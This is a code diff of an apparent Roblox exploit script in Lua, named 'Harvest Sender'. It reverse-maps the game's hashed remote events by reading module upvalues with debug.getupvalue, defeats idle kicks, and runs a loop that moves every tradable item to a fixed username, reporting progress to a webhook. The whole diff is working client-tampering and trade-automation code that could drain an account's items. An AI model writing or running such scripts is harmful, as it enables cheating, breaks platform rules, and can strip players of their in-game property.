@@ -53,61 +53,37 @@ LocalPlayer.Idled:Connect(function()
     VirtualUser:ClickButton2(Vector2.new())
 end)
 
--- Dehash (multi-method with fallbacks)
+-- ============================================
+-- DEHASH REMOTES (fixed: scans all upvalues)
+-- ============================================
+
 local function dehash()
-    local function rename(remotename, hashedremote)
-        hashedremote.Name = remotename
+    local router = require(RS.ClientModules.Core.RouterClient.RouterClient)
+    local fn = router.init
+
+    for i = 1, 30 do
+        local ok, val = pcall(debug.getupvalue, fn, i)
+        if ok and type(val) == "table" then
+            local hasRemotes = false
+            for _, v in pairs(val) do
+                if typeof(v) == "Instance" and (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
+                    hasRemotes = true
+                    break
+                end
+            end
+            if hasRemotes then
+                for name, remote in pairs(val) do
+                    pcall(function() remote.Name = name end)
+                end
+                print("[Dehash] Success at upvalue index " .. i)
+                return
+            end
+        end
     end
 
-    -- Method 1: getupvalue index 7 (most common)
-    local ok1 = pcall(function()
-        local router = require(RS.ClientModules.Core.RouterClient.RouterClient)
-        local upvals = debug.getupvalues(router.init)
-        for i, v in pairs(upvals) do
-            if type(v) == "table" then
-                for name, remote in pairs(v) do
-                    if typeof(remote) == "Instance" then
-                        pcall(function() remote.Name = name end)
-                    end
-                end
-            end
-        end
-    end)
-    if ok1 then print("[Dehash] Method 1 OK") return end
-
-    -- Method 2: table.foreach + getupvalue (original approach)
-    local ok2 = pcall(function()
-        table.foreach(
-            getupvalue(require(RS.ClientModules.Core.RouterClient.RouterClient).init, 7),
-            rename
-        )
-    end)
-    if ok2 then print("[Dehash] Method 2 OK") return end
-
-    -- Method 3: debug.getupvalue index scan
-    local ok3 = pcall(function()
-        local router = require(RS.ClientModules.Core.RouterClient.RouterClient)
-        for i = 1, 20 do
-            local ok, val = pcall(debug.getupvalue, router.init, i)
-            if ok and type(val) == "table" then
-                local hasRemotes = false
-                for _, v in pairs(val) do
-                    if typeof(v) == "Instance" then hasRemotes = true break end
-                end
-                if hasRemotes then
-                    for name, remote in pairs(val) do
-                        pcall(function() remote.Name = name end)
-                    end
-                    print("[Dehash] Method 3 OK (upvalue index " .. i .. ")")
-                    return
-                end
-            end
-        end
-    end)
-    if ok3 then return end
-
-    warn("[Dehash] All methods failed - remotes may still be hashed, continuing anyway...")
+    warn("[Dehash] Failed — no remote table found in upvalues")
 end
+
 dehash()
 task.wait(1)
 
@@ -243,7 +219,7 @@ local function refreshItems()
 end
 
 -- ============================================
--- TRADE FUNCTIONS (from autoTradeALL.lua)
+-- TRADE FUNCTIONS
 -- ============================================
 
 local function send_trade(username)
@@ -280,7 +256,7 @@ log("Found '" .. USERNAME .. "'!")
 sendWebhook("Harvest Sender started | Pets: " .. table.concat(PET_NAMES, ", "))
 
 -- ============================================
--- MAIN TRADE LOOP (from autoTradeALL.lua logic)
+-- MAIN TRADE LOOP
 -- ============================================
 
 local trade_status = false
@@ -290,14 +266,12 @@ refreshItems()
 
 local function autotrade()
     if #items_unique_ids > 0 and not tradeGuiVisible() then
-        -- Send trade request
         trade_status = false
         send_trade(USERNAME)
         log("Trade request sent to " .. USERNAME)
         sendWebhook("Trade request sent to " .. USERNAME)
 
     elseif not trade_status and tradeGuiVisible() then
-        -- Add up to 18 items (your friend's script uses 18)
         local counter = 0
         while #items_unique_ids > 0 and counter < 18 do
             local unique = table.remove(items_unique_ids, 1)
@@ -310,7 +284,6 @@ local function autotrade()
         trade_status = true
 
     elseif trade_status and tradeGuiVisible() then
-        -- Accept & confirm until trade closes
         repeat
             task.wait(1)
             first_trade_accept()
@@ -329,7 +302,6 @@ local function autotrade()
     end
 end
 
--- Keep trading until no items left
 repeat
     autotrade()
     refreshItems()
